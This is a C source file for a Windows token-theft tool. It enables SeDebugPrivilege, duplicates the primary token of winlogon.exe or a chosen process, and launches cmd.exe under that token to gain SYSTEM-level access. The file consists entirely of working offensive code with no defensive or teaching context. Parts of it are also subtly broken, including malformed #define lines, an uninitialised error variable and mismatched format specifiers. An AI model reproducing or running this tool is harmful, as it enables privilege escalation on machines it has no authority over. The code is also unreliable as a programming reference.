#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>

#include "nt-system.h"

enum LogonFlags { WithProfile = 1, NetCredentialsOnly }; 

enum CreationFlags
{
	DefaultErrorMode = 0x04000000,
	NewConsole = 0x00000010,
	NewProcessGroup = 0x00000200,
	SeparateWOWVDM = 0x00000800,
	Suspended = 0x00000004,
	UnicodeEnvironment = 0x00000400,
	ExtendedStartupInfoPresent = 0x00080000
}; 
/*
#ifndef LUID

struct _LUID {
	DWORD LowPart;
	LONG  HighPart;
} LUID, * PLUID;

#endif
*/
#ifndef TOKEN_QUERY 
 #define STANDARD_RIGHTS_REQUIRED = 0x000F0000
 #define STANDARD_RIGHTS_READ = 0x00020000
 #define TOKEN_ASSIGN_PRIMARY = 0x0001
 #define TOKEN_DUPLICATE = 0x0002
 #define TOKEN_IMPERSONATE = 0x0004
 #define TOKEN_QUERY = 0x0008
 #define TOKEN_QUERY_SOURCE = 0x0010
 #define TOKEN_ADJUST_PRIVILEGES = 0x0020
 #define TOKEN_ADJUST_GROUPS = 0x0040
 #define TOKEN_ADJUST_DEFAULT = 0x0080
 #define TOKEN_ADJUST_SESSIONID = 0x0100
 #define TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY) 
 #define TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | \
	 TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |\
	 TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |\
	 TOKEN_ADJUST_SESSIONID)
#endif

int main(int argc, char *argv[]){

	BOOL is_winlogon = FALSE; 

	if (argc != 2) {
		puts("\n[+]using by default winlogon.exe\n");
		is_winlogon = TRUE;
	}

	/* Enabling SeDebugpriv in case its not enabled */

	const WCHAR*  Privilege = L"SeDebugPrivilege";
	
	HANDLE token; 
	PHANDLE hToken = &token; 
	LUID luid;
	TOKEN_PRIVILEGES TP;
	LUID_AND_ATTRIBUTES lu_attr ;
	DWORD trash; 
	
	HANDLE hCurrentproc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if(hCurrentproc == INVALID_HANDLE_VALUE){
		puts("[-] Couldn't open handle to current process\n");
		exit(EXIT_FAILURE); 
	}

	if(!OpenProcessToken(hCurrentproc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,hToken)){
	 	fprintf(stderr, "[-] error retrieving token for the current process :\n");
		perrno((char *)"OpenProcessToken");
		CloseHandle(hCurrentproc);
		exit(EXIT_FAILURE); 
	}

	if(!LookupPrivilegeValue(NULL, (LPCSTR)Privilege, &luid)){
		fprintf(stderr, "[-] couldnt get a handle to privilege struct\n");
		perror("LookupPrivilegeValue");
		CloseHandle(hCurrentproc);
		exit(EXIT_FAILURE); 
	}

	/* Saving old state */
	TOKEN_PRIVILEGES old_state = TOKEN_PRIVILEGES(); 

	lu_attr.Luid = luid; 
	lu_attr.Attributes = SE_PRIVILEGE_ENABLED;
	TP.PrivilegeCount = 1;
	TP.Privileges[0] = lu_attr; 

	if (!AdjustTokenPrivileges(token, FALSE, &TP, (unsigned __int32)sizeof(TP), &old_state, &trash)) {
		printf("%d", GetLastError());
		puts("[-] can't adjust token for debug priveleges "); 
		exit(1); 
	}
	puts("[+] SeDebugPrivilege set up correctly!\n"); 

	/* duplicating the token */

	HANDLE target = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, is_winlogon ? get_proc_id((char *)"winlogon.exe") : get_proc_id(argv[1])); 
	if(!target){
		fprintf(stderr, "Can't find %d PID", is_winlogon ? "winlogon.exe" : argv[1]);
		CloseHandle(hCurrentproc);
		return -1;
	}

	SECURITY_IMPERSONATION_LEVEL seImpLv = SecurityImpersonation; 
	TOKEN_TYPE tkentype = TokenPrimary; 
	SECURITY_ATTRIBUTES sec_att = SECURITY_ATTRIBUTES(); 
	HANDLE newtoken; 

	if (target == INVALID_HANDLE_VALUE)
	{
		puts("[-] Couldn't open handle to target process\n");
		CloseHandle(hCurrentproc);
		exit(1);
	}

	if (!OpenProcessToken(target, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, hToken))
	{

		puts("[-] error retrieving token for the target process\n");
		CloseHandle(hCurrentproc);
		exit(1);
	}
	puts("[+] system process token retrieved\n"); 
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, &sec_att, seImpLv, tkentype, &newtoken))
	{
		printf("%d", GetLastError()); 
		puts("[+] unable to duplicate token \n"); 
		CloseHandle(hCurrentproc);
		exit(1); 
	}
	puts("[+] Token duplicated successfully\n"); 
	
	/* Creating the new process and getting NT AUTHORITY privilege */
	STARTUPINFO SI = STARTUPINFO(); 
	PROCESS_INFORMATION PI; 

	if (!CreateProcessWithTokenW(newtoken, NetCredentialsOnly, L"C:\\Windows\\System32\\cmd.exe", NULL, NewConsole, 0, NULL, (LPSTARTUPINFOW)&SI, &PI)) 
	{

		puts("[+] unable to create process \n");
		CloseHandle(hCurrentproc);
		exit(1);
	}
	puts("[+] process Created success !"); 
	return 0;
}

DWORD get_proc_id(char *name){
	DWORD pid = 0;
	PROCESSENTRY32 pe = {0};

	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(h == INVALID_HANDLE_VALUE){
		fprintf(stderr, "CreateToolhelp32Snapshot failed with %lld\n", GetLastError());
		return pid;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);
	if(Process32First(h, &pe)){
		do{
			if(!strcmp(pe.szExeFile, name)){
				pid = pe.th32ProcessID;
				break;
			}
		}while(Process32Next(h, &pe));
	}
	else
		perrno((char *)"Process32First");

	CloseHandle(h);

	return pid;
}

void perrno(const char *func){
 	TCHAR err_msg[256] = {0};
 	DWORD errn;
 
 	FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
          NULL, errn,
          MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
          err_msg, 256, NULL );
 
 	 fprintf(stderr, "\n WARNING: %s failed with error %d (%s)\n", func, errno, err_msg );
 }
